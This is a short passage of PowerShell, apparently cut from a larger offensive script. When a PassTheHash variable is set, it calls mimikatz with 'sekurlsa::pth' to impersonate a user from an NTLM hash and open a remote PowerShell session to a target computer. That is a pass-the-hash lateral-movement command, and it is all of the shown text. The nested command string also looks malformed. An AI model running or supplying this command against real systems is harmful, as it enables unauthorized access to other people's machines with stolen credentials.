...
Write-Host ""
if(Test-Path variable:PassTheHash) { cmd /c $mimipath\mimikatz.exe "sekurlsa::pth /user:$user /ntlm:$ntlmpass /run:powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" }
